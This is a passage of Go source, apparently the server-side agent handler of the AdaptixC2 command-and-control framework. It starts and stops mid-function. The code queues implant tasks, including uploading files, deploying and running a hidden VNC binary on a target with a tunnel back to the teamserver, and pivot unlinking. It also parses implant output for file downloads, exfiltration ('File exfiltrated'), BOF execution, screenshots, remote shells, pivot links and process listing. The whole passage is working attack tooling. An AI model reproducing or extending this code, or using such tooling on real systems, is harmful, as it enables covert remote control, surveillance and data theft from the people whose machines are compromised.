		pivotName, err = getStringArg(args, "id")
		if err != nil {
			goto RET
		}

		pivotId, _, _ := Ts.TsGetPivotInfoByName(pivotName)
		if pivotId == "" {
			err = fmt.Errorf("pivot %s does not exist", pivotName)
			goto RET
		}
		id, _ := strconv.ParseInt(pivotId, 16, 64)

		array = []interface{}{COMMAND_UNLINK, int(id)}

	case "upload":
		var fileName string
		var localFile string
		var fileContent []byte

		fileName, err = getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)

		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}
	case "vnc":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		if subcommand == "start" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc start <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var localBinary string
			var remotePath string
			var runCommandPrefix string
			localBinary, remotePath, runCommandPrefix, err = vncStreamBinaryForBeacon(agentData)
			if err != nil {
				goto RET
			}

			var vncBinary []byte
			vncBinary, err = os.ReadFile(localBinary)
			if err != nil {
				err = fmt.Errorf("failed to read vnc stream binary %s: %w", localBinary, err)
				goto RET
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			queueBeaconUpload(agentData, remotePath, vncBinary)

			taskData.Type = adaptix.TASK_TYPE_JOB
			runCommand := fmt.Sprintf("%s %d --quality 75 --no-detach", runCommandPrefix, targetPort)
			array = []interface{}{COMMAND_PS_RUN, false, false, 0, Ts.TsConvertUTF8toCp(runCommand, agentData.ACP)}

			taskData.Message = fmt.Sprintf("VNC auto-start queued: upload %s, run on agent port %d, tunnel local port %d. Open /vnc/viewer?local=%d after the run task starts.", remotePath, targetPort, localPort, localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "native" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc native <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			taskData.Message = fmt.Sprintf("Native VNC tunnel started: teamserver port %d -> agent 127.0.0.1:%d. Open the Tunnels tab and use Open VNC viewer.", localPort, targetPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "deploy" {
			targetPortNumber, err1 := getFloatArg(args, "target_port")
			localPortNumber, err2 := getFloatArg(args, "local_port")
			if err1 != nil || err2 != nil {
				err = errors.New("usage: vnc deploy <target_port> <local_port>")
				goto RET
			}
			targetPort := int(targetPortNumber)
			localPort := int(localPortNumber)
			if targetPort < 1 || targetPort > 65535 || localPort < 1 || localPort > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var payload nativeVncPayload
			payload, err = resolveNativeVncPayload(agentData, targetPort)
			if err != nil {
				goto RET
			}

			fileContents := make([][]byte, len(payload.Files))
			for i, payloadFile := range payload.Files {
				fileContents[i], err = os.ReadFile(payloadFile.LocalPath)
				if err != nil {
					err = fmt.Errorf("failed to read native VNC payload %s: %w", payloadFile.LocalPath, err)
					goto RET
				}
			}

			tunnelId, e := Ts.TsTunnelCreateLportfwd(agentData.Id, "Native VNC Desktop", "0.0.0.0", localPort, "127.0.0.1", targetPort)
			if e != nil {
				err = e
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			for _, remoteDir := range payload.RemoteDirs {
				queueBeaconMkdir(agentData, remoteDir)
			}
			for i, payloadFile := range payload.Files {
				queueBeaconUpload(agentData, payloadFile.RemotePath, fileContents[i])
			}

			taskData.Type = adaptix.TASK_TYPE_JOB
			array = []interface{}{COMMAND_PS_RUN, false, false, 0, Ts.TsConvertUTF8toCp(payload.RunCommand, agentData.ACP)}

			taskData.Message = fmt.Sprintf("Native VNC auto-start queued: upload %d file(s) to %s, run on agent port %d, tunnel local port %d. The client viewer opens automatically when the tunnel syncs.", len(payload.Files), payload.RemoteDir, targetPort, localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			portNumber, e := getFloatArg(args, "local_port")
			if e != nil {
				err = errors.New("usage: vnc stop <local_port>")
				goto RET
			}
			localPort := int(portNumber)
			Ts.TsTunnelStopLportfwd(agentData.Id, localPort)

			taskData.Message = fmt.Sprintf("VNC session on port %d stopped", localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "view" {
			portNumber, e := getFloatArg(args, "local_port")
			if e != nil {
				portNumber = 41484
			}
			localPort := int(portNumber)
			taskData.Message = fmt.Sprintf("VNC Viewer: open /vnc/viewer?local=%d in browser after vnc_stream is listening on the agent", localPort)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "list" {
			taskData.Message = "Active VNC sessions can be viewed via the Tunnels tab. Look for VNC Desktop tunnels."
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be start, native, deploy, stop, view, or list")
			goto RET
		}

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	taskData.Data, err = PackArray(array)

	/// END CODE

RET:
	return taskData, messageData, err
}

func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	/// START CODE

	decompressed, _ := decompressZlibData(decryptedData)

	packer := CreatePacker(decompressed)

	if false == packer.CheckPacker([]string{"int"}) {
		return errors.New("failed to unmarshal message")
	}

	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return errors.New("failed to unmarshal message")
	}

	bof_output := make(map[string]bool)

	for packer.Size() >= 8 {

		if false == packer.CheckPacker([]string{"int", "int"}) {
			goto HANDLER
		}

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var drives []adaptix.ListingDrivesDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				drivesCount := int(packer.ParseInt32())

				for i := 0; i < drivesCount; i++ {
					if false == packer.CheckPacker([]string{"byte", "int"}) {
						goto HANDLER
					}
					var driveData adaptix.ListingDrivesDataWin
					driveCode := packer.ParseInt8()
					driveType := packer.ParseInt32()

					driveData.Name = fmt.Sprintf("%c:", driveCode)
					if driveType == 2 {
						driveData.Type = "USB"
					} else if driveType == 3 {
						driveData.Type = "Hard Drive"
					} else if driveType == 4 {
						driveData.Type = "Network Drive"
					} else if driveType == 5 {
						driveData.Type = "CD-ROM"
					} else {
						driveData.Type = "Unknown"
					}

					drives = append(drives, driveData)
				}

				OutputText := fmt.Sprintf(" %-5s  %s\n", "Drive", "Type")
				OutputText += fmt.Sprintf(" %-5s  %s", "-----", "-----")
				for _, item := range drives {
					OutputText += fmt.Sprintf("\n %-5s  %s", item.Name, item.Type)
				}
				task.Message = "List of mounted drives:"
				task.ClearText = OutputText
			}

			Ts.TsClientGuiDisksWindows(task, drives)

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"long", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt64()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileId, fileName, int64(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				task.Completed = false
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_EXFIL:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				_ = Ts.TsDownloadUpdate(fileId, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
			}

		case COMMAND_EXEC_BOF:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			state := packer.ParseInt8()
			if state == 1 {
				task.Message = "Async BOF started"
				task.Completed = false
			} else {
				task.Message = "BOF finished"
				task.Completed = true
			}

		case COMMAND_EXEC_BOF_OUT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			outputType := packer.ParseInt32()

			if outputType == BOF_ERROR_PARSE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Parse BOF error"

			} else if outputType == BOF_ERROR_MAX_FUNCS {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "The number of functions in the BOF file exceeds 512"

			} else if outputType == BOF_ERROR_ENTRY {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Entry function not found"

			} else if outputType == BOF_ERROR_ALLOC {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				_ = packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Error allocation of BOF memory"

			} else if outputType == BOF_ERROR_SYMBOL {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF error"
				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)

			} else if outputType == CALLBACK_OUTPUT_UTF8 {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = output

			} else if outputType == CALLBACK_AX_SCREENSHOT {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				note := packer.ParseString()
				screen := packer.ParseBytes()

				_ = Ts.TsScreenshotAdd(agentData.Id, note, screen)

			} else if outputType == CALLBACK_AX_DOWNLOAD_MEM {
				if false == packer.CheckPacker([]string{"array", "array"}) {
					goto HANDLER
				}
				filename := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				data := packer.ParseBytes()
				fileId := fmt.Sprintf("%08x", rand.Uint32())

				_ = Ts.TsDownloadAdd(agentData.Id, fileId, filename, int64(len(data)))
				_ = Ts.TsDownloadSave(agentData.Id, fileId, filename, data)

				Ts.TsAgentConsoleOutput(agentData.Id, adaptix.MESSAGE_SUCCESS, "pillager_bridge",
					fmt.Sprintf("[+] File exfiltrated: %s (%v bytes)", filename, len(data)), true)

			} else {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				output := packer.ParseString()

				_, ok := bof_output[task.TaskId]
				if ok {
					task.Message = ""
				} else {
					bof_output[task.TaskId] = true
					task.Message = "BOF output"
				}

				task.MessageType = adaptix.MESSAGE_SUCCESS
				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
			}

			task.Completed = false

		case COMMAND_GETUID:
			if false == packer.CheckPacker([]string{"byte", "array", "array"}) {
				goto HANDLER
			}

			high := packer.ParseInt8()
			domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			message := ""

			if username != "" {
				if domain != "" {
					username = domain + "\\" + username
				}
				message = fmt.Sprintf("You are '%v'", username)
				if high > 0 {
					message += " (elevated)"
				}
			}
			task.Message = message

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}

			jobType := packer.ParseInt8()
			state := packer.ParseInt8()

			if jobType == JOB_TYPE_SHELL {
				tunnelId := task.TaskId

				if state == JOB_STATE_STARTING {
					Ts.TsTerminalConnResume(agentData.Id, tunnelId, false)

				} else if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					data := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					Ts.TsTerminalConnData(tunnelId, []byte(data))

				} else if state == JOB_STATE_KILLED {
					_ = Ts.TsTerminalConnClose(tunnelId, "Terminal stopped")

				} else if state == JOB_STATE_FINISHED {
					if false == packer.CheckPacker([]string{"int"}) {
						goto HANDLER
					}
					errorCode := packer.ParseInt32()
					status := fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
					_ = Ts.TsTerminalConnClose(tunnelId, status)
				}

			} else {
				if state == JOB_STATE_RUNNING {
					if false == packer.CheckPacker([]string{"array"}) {
						goto HANDLER
					}
					task.Completed = false
					jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
					task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
					task.ClearText = jobOutput
				} else if state == JOB_STATE_KILLED {
					task.Completed = true
					task.MessageType = adaptix.MESSAGE_INFO
					task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
				} else if state == JOB_STATE_FINISHED {
					task.Completed = true
					task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
				}
			}

		case COMMAND_JOB_LIST:
			var Output string
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			count := packer.ParseInt32()

			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
						goto HANDLER
					}
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == 0x1 {
						stringType = "Local"
					} else if jobType == 0x2 {
						stringType = "Remote"
					} else if jobType == 0x3 {
						stringType = "Process"
					} else if jobType == 0x4 {
						stringType = "Shell"
					} else if jobType == 0x5 {
						stringType = "Async BOF"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}

		case COMMAND_JOBS_KILL:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %v not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
			}

		case COMMAND_LINK:
			if false == packer.CheckPacker([]string{"byte", "int", "array"}) {
				goto HANDLER
			}

			linkType := packer.ParseInt8()
			wmVal := packer.ParseInt32()
			watermark := fmt.Sprintf("%08x", wmVal)
			beatSuffix := packer.ParseBytes()
			// Pivotter sends listener WM as separate int32 + ciphertext only; InternalHandler expects full beat (4-byte WM + RC4 blob).
			wmBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(wmBytes, uint32(wmVal))
			fullBeat := append(wmBytes, beatSuffix...)

			childAgentId, errPivot := Ts.TsListenerInteralHandler(watermark, fullBeat)
			if errPivot != nil {
				task.MessageType = adaptix.MESSAGE_ERROR
				task.Message = fmt.Sprintf("Pivot link failed: %v", errPivot)
				break
			}
			_ = Ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)

			if linkType == 1 {
				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			} else if linkType == 2 {
				task.Message = fmt.Sprintf("----- New TCP pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, task.Message, "\n", true)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()

			var items []adaptix.ListingFileDataWin
			var rootPath string

			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {

					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin

					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = OutputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PIVOT_EXEC:
			if false == packer.CheckPacker([]string{"int", "array"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotData := packer.ParseBytes()

			_, _, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			_ = Ts.TsAgentProcessData(childAgentId, pivotData)

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			subcommand := packer.ParseInt32()

			if subcommand == 1 {
				if false == packer.CheckPacker([]string{"int", "int"}) {
					goto HANDLER
				}
				agentData.Sleep = packer.ParseInt32()
				agentData.Jitter = packer.ParseInt32()

				task.Message = "Sleep time has been changed"

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 2 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				size := packer.ParseInt32()
				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)

			} else if subcommand == 3 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.KillDate = int(packer.ParseInt32())

				task.Message = "Option 'killdate' is set"
				if agentData.KillDate == 0 {
					task.Message = "The 'killdate' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 4 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				agentData.WorkingTime = int(packer.ParseInt32())

				task.Message = "Option 'workingtime' is set"
				if agentData.WorkingTime == 0 {
					task.Message = "The 'workingtime' option is disabled"
				}

				_ = Ts.TsAgentUpdateData(agentData)

			} else if subcommand == 5 { // Burst set response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config updated: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))

			} else if subcommand == 6 {
				// Burst show response
				if false == packer.CheckPacker([]string{"int", "int", "int"}) {
					goto HANDLER
				}
				burstEnabled := packer.ParseInt32()
				burstSleep := packer.ParseInt32()
				burstJitter := packer.ParseInt32()

				task.Message = fmt.Sprintf("Burst config: %s", formatBurstStatus(int(burstEnabled), int(burstSleep), int(burstJitter)))
			}

		case COMMAND_PS_LIST:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				goto HANDLER
			}

			result := packer.ParseInt8()

			var proclist []adaptix.ListingProcessDataWin

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
						goto HANDLER
					}
					procData := adaptix.ListingProcessDataWin{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

					procData.ProcessName = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					proclist = append(proclist, procData)
				}

				type TreeProc struct {
					Data     adaptix.ListingProcessDataWin
					Children []*TreeProc
				}

				procMap := make(map[uint]*TreeProc)
				var roots []*TreeProc

				for _, proc := range proclist {
					node := &TreeProc{Data: proc}
					procMap[proc.Pid] = node
				}

				for _, node := range procMap {
					if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
						roots = append(roots, node)
					} else if parent, ok := procMap[node.Data.Ppid]; ok {
						parent.Children = append(parent.Children, node)
					} else {
						roots = append(roots, node) // orphaned node
					}
				}

				sort.Slice(roots, func(i, j int) bool {
					return roots[i].Data.Pid < roots[j].Data.Pid
				})

				var sortChildren func(node *TreeProc)
				sortChildren = func(node *TreeProc) {
					sort.Slice(node.Children, func(i, j int) bool {
						return node.Children[i].Data.Pid < node.Children[j].Data.Pid
					})
					for _, child := range node.Children {
						sortChildren(child)
					}
				}
				for _, root := range roots {
					sortChildren(root)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				var lines []string

				var formatTree func(node *TreeProc, prefix string, isLast bool)
				formatTree = func(node *TreeProc, prefix string, isLast bool) {
					branch := "├─ "
					if isLast {
						branch = "└─ "
					}
					treePrefix := prefix + branch
					data := node.Data

					line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
					lines = append(lines, line)

					childPrefix := prefix
					if isLast {
						childPrefix += "    "
					} else {
						childPrefix += "│   "
					}

					for i, child := range node.Children {
						formatTree(child, childPrefix, i == len(node.Children)-1)
					}
				}

				for i, root := range roots {
					formatTree(root, "", i == len(roots)-1)
				}

				OutputText += "\n" + strings.Join(lines, "\n")
				task.Message = "Process list:"
				task.ClearText = OutputText
			}
			Ts.TsClientGuiProcessWindows(task, proclist)

		case COMMAND_PS_KILL:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

